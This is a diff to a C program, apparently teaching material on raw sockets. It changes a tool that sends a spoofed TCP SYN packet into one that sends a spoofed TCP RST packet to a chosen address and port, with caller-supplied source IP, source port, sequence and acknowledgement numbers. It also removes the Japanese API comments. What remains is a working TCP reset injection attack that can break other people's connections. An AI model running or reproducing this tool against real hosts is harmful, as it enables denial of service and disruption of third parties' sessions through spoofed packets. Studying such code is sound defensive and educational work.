@@ -33,7 +33,8 @@ enum
     DST_PORT,
     SRC_IP,
     SRC_PORT,
-    SEQ
+    SEQ,
+    ACK
 };
 
 struct packet_tcp
@@ -43,7 +44,6 @@ struct packet_tcp
     unsigned char data[MAXDATA];
 };
 
-/* プロトタイプ宣言 */
 void make_ip_header(struct ip *ip, int src_ip, int dst_ip, int len);
 void make_tcp_header(struct packet_tcp *packet, int src_ip, int src_port,
                      int dst_ip, int dst_port, int seq, int ack, int datalen);
@@ -64,101 +64,42 @@ int main(int argc, char *argv[])
     int iplen;
     int on = 1;
 
-    /* 引数チェック */
-    if (argc != 6)
+    if (argc != 7)
     {
-        fprintf(stderr, "usage: %s dst_ip dst_port src_ip src_port seq\n",
+        fprintf(stderr, "usage: %s dst_ip dst_port src_ip src_port seq ack\n",
                 argv[CMD_NAME]);
         exit(EXIT_FAILURE);
     }
 
-    /*
-        * 書式
-        #include <sys/types.h>
-        #include <sys/socket.h>
-
-        int
-        socket(int domain, int type, int protocol);
-
-        * 解説
-        socket()は, 通信のエンドポイントを生成してそのエンドポイントを参照するファイルディスクリプタ
-        を返す. エラーが発生した場合は-1を返す
-     */
     if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)
     {
         perror("socket(SOCK_RAW)");
         exit(EXIT_FAILURE);
     }
 
-    /*
-        * 書式
-        #include <sys/types.h>
-        #include <sys/socket.h>
-
-        int
-        setsockopt(int s, int level, int optname, const void *optval, socklen_t optlen);
-
-        * 解説
-        ソケットに関するオプションを設定する
-        正常に終了した場合は0を, そうでない場合は-1を返す
-     */
     if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof on) < 0)
     {
         perror("setsockopt(IPPROTO_IP, IP_HDRINCL)");
         exit(EXIT_FAILURE);
     }
 
-    /*
-        * 書式
-        #include <string.h>
-
-        void*
-        memset(void *b, int c, size_t len);
-
-        * 解説
-        memset()関数は, 値 c(unsigned charに変換)のlenバイトを文字列bに書き込む
-     */
     memset(&dest, 0, sizeof dest);
     dest.sin_family = AF_INET;
     dst_ip = dest.sin_addr.s_addr = inet_addr(argv[DST_IP]);
     src_ip = inet_addr(argv[SRC_IP]);
-
-    /*
-        #include <stdio.h>
-
-        int
-        sscanf(const char *str, const char *format, ...);
-
-        * 解説
-         sscanf()は, 入力をstrの指すキャラクタ文字列から読み取る
-     */
     sscanf(argv[DST_PORT], "%hu", &dst_port);
     sscanf(argv[SRC_PORT], "%hu", &src_port);
     sscanf(argv[SEQ], "%ul", &seq);
-    ack = 0;
+    sscanf(argv[ACK], "%ul", &ack);
     datalen = 0;
     iplen = datalen + (sizeof send.ip) + (sizeof send.tcp);
 
     memset(&send, 0, sizeof send);
     make_tcp_header(&send, src_ip, src_port, dst_ip, dst_port, seq, ack, datalen);
     make_ip_header(&(send.ip), src_ip, dst_ip, iplen);
-
     CHKADDRESS(dst_ip);
 
-    printf("SYN send to %s.\n", argv[DST_IP]);
-
-    /*
-        * 書式
-        #include <sys/types.h>
-        #include <sys/socket.h>
-
-        ssize_
-        sendto(int s, const void *msg, size_t len, int flags, const struct sockaddr *to, socklen_t tolen);
-
-        * 解説
-        メッセージを別のソケットに送信するのに使用する
-        成功した場合は送信された文字数を、エラーが起きた場合は-1を返す
-     */
+    printf("reset %s\n", argv[DST_IP]);
     if (sendto(s, (char *)&send, iplen, 0, (struct sockaddr *)&dest, sizeof dest) < 0)
     {
         perror("sendto");
@@ -171,14 +112,12 @@ int main(int argc, char *argv[])
 
 void make_tcp_header(struct packet_tcp *packet, int src_ip, int src_port, int dst_ip, int dst_port, int seq, int ack, int datalen)
 {
-    /* htonl()関数は, unsigned integer hostlongをホストバイトオーダーからネットワークバイトオーダーに変換する */
     packet->tcp.th_seq = htonl(seq);
     packet->tcp.th_ack = htonl(ack);
-    /* htons()関数は, unsigned short integer hostshortをホストバイトオーダーからネットワークバイトオーダーに変換する */
     packet->tcp.th_sport = htons(src_port);
     packet->tcp.th_dport = htons(dst_port);
     packet->tcp.th_off = 5;
-    packet->tcp.th_flags = TH_SYN;
+    packet->tcp.th_flags = TH_RST;
     packet->tcp.th_win = htons(8192);
     packet->tcp.th_urp = htons(0);
 
